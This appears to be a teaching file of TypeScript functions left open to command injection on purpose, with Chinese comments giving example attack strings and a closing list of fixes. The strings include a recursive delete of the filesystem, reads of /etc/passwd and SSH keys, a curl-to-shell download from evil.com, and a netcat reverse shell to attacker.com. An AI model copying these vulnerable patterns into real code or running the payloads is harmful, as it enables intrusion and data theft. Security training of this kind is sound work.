/**
 * ⚠️ 警告：此文件包含多个严重的安全漏洞（命令注入）
 * 仅用于教学和安全测试目的，不得在生产环境使用
 */

import { exec, spawn } from "child_process"
import { promisify } from "util"

const execAsync = promisify(exec)

// ========================================
// 漏洞 1：直接拼接用户输入到命令中
// ========================================
/**
 * 危险：ping 工具
 * 用户输入直接拼接到命令字符串中，没有任何验证或转义
 * 攻击示例: target = "8.8.8.8; rm -rf /"
 */
export async function pingHost(target: string): Promise<string> {
	const command = `ping -c 4 ${target}` // ❌ 命令注入漏洞
	const { stdout } = await execAsync(command)
	return stdout
}

/**
 * 危险：获取系统信息
 * 任何用户输入都会被执行
 * 攻击示例: tool = "ls; whoami; cat /etc/passwd"
 */
export function getSystemInfo(tool: string): Promise<string> {
	return execAsync(tool) // ❌ 命令注入漏洞
}

// ========================================
// 漏洞 2：使用 spawn 但未正确处理参数
// ========================================
/**
 * 危险：文件查找命令
 * Shell: true 允许命令注入
 * 攻击示例: pattern = "*.txt; cat ~/.ssh/id_rsa"
 */
export function findFiles(pattern: string): Promise<string> {
	return new Promise((resolve) => {
		spawn("find", [`/home -name ${pattern}`, "-type", "f"], {
			shell: true, // ❌ shell: true 允许命令注入
		}).stdout.on("data", (data) => resolve(data.toString()))
	})
}

// ========================================
// 漏洞 3：动态命令构建
// ========================================
/**
 * 危险：动态命令执行器
 * 用户可以通过注入改变整个命令结构
 * 攻击示例: cmd = "&& malicious_script.sh"
 */
export async function executeDynamicCommand(baseCmd: string, args: string[]): Promise<string> {
	const command = `${baseCmd} ${args.join(" ")}` // ❌ 命令注入漏洞
	const { stdout } = await execAsync(command)
	return stdout
}

/**
 * 危险：Web 应用中的文件处理
 * 攻击示例: filename = "secret.txt; malware.sh"
 */
export function processUploadedFile(filename: string): void {
	exec(`/bin/sh process.sh ${filename}`) // ❌ 命令注入漏洞
}

// ========================================
// 漏洞 4：环境变量注入
// ========================================
/**
 * 危险：从环境变量获取命令
 * 攻击者可以设置恶意环境变量
 */
export function getConfigValue(key: string): void {
	const configCmd = process.env[`CONFIG_CMD_${key}`]
	if (configCmd) {
		exec(configCmd) // ❌ 命令注入漏洞
	}
}

// ========================================
// 漏洞 5：日志记录中的命令注入
// ========================================
/**
 * 危险：将用户输入记录到日志系统
 * 如果日志处理程序使用系统命令
 * 攻击示例: logEntry = "data; evil_command"
 */
export function logUserAction(userId: string, action: string): void {
	const logEntry = `${userId}:${action}`
	exec(`logger -t user_actions "${logEntry}"`) // ❌ 命令注入漏洞
}

// ========================================
// 漏洞 6：备份系统中的漏洞
// ========================================
/**
 * 危险：备份文件到远程服务器
 * 攻击示例: sourcePath = "/data; cat /etc/passwd"
 */
export async function backupFile(sourcePath: string): Promise<void> {
	const command = `rsync -av ${sourcePath} /backup/` // ❌ 命令注入漏洞
	await execAsync(command)
}

// ========================================
// 漏洞 7：数据库操作中的命令注入
// ========================================
/**
 * 危险：使用 shell 命令操作数据库
 * 攻击示例: query = "SELECT * FROM users; DROP TABLE users; --"
 */
export function exportDatabase(query: string): Promise<string> {
	const cmd = `mysql -u root -p"password" -e "${query}"` // ❌ 命令注入漏洞
	return execAsync(cmd)
}

// ========================================
// 漏洞 8：系统监控工具
// ========================================
/**
 * 危险：监控应用程序状态
 * 攻击示例: appName = "myapp; systemctl stop nginx"
 */
export function checkAppStatus(appName: string): Promise<string> {
	return execAsync(`systemctl status ${appName}`) // ❌ 命令注入漏洞
}

// ========================================
// 漏洞 9：Webhook 处理
// ========================================
/**
 * 危险：处理 webhook payload
 * 攻击示例: payload.command = "curl http://evil.com/malware.sh | sh"
 */
export async function handleWebhook(payload: any): Promise<void> {
	if (payload.command) {
		await execAsync(payload.command) // ❌ 命令注入漏洞
	}
}

// ========================================
// 漏洞 10：批量文件压缩
// ========================================
/**
 * 危险：压缩文件
 * 攻击示例: fileList = "file1.tar.gz; nc attacker.com 4444 -e /bin/sh"
 */
export async function compressFiles(fileList: string): Promise<string> {
	const command = `tar -czf archive.tar.gz ${fileList}` // ❌ 命令注入漏洞
	const { stdout } = await execAsync(command)
	return stdout
}

// ========================================
// 使用示例（仅演示）
// ========================================
/*
// ⚠️ 以下代码展示了如何触发这些漏洞（切勿在生产环境运行）

async function demonstrateVulnerabilities() {
  // 漏洞 1 示例
  await pingHost('8.8.8.8 && cat /etc/passwd');

  // 漏洞 2 示例
  await findFiles('*.txt; whoami');

  // 漏洞 3 示例
  await executeDynamicCommand('ls', ['-al', ';', 'rm', '-rf', '/tmp']);

  // 漏洞 10 示例
  await compressFiles('data.txt; nc attacker.com 4444 -e /bin/bash');
}
*/

/**
 * 安全修复建议：
 * 1. 使用参数化命令（不要使用 shell: true）
 * 2. 对所有用户输入进行严格的验证和转义
 * 3. 使用白名单验证输入格式
 * 4. 使用专门的库如 `shell-escape` 或 `escape-shell-cmd`
 * 5. 避免直接执行用户可控的命令
 * 6. 使用 spawn 的数组参数形式，而不是字符串形式
 */
